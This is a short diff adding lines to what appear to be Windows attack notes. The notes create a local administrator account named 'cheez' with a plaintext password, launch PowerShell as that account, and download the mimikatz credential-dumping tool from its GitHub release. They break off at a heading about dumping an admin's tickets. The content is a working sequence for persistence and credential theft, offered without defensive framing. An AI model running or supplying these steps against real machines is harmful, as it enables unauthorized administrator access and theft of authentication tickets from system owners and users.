@@ -110,3 +110,12 @@ New-LocalUser "cheez" -Password (ConvertTo-SecureString -AsPlainText -String 'So
 Add-LocalGroupMember -Group "Administrators" -Member "cheez"
 
 Logon as cheez
+runas /user:cheez powershell.exe
+
+Download mimikatz
+[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+Invoke-WebRequest -Uri "https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20200918-fix/mimikatz_trunk.zip" -OutFile "mimikatz_trunk.zip"
+
+Dump tickets for admin
+
+
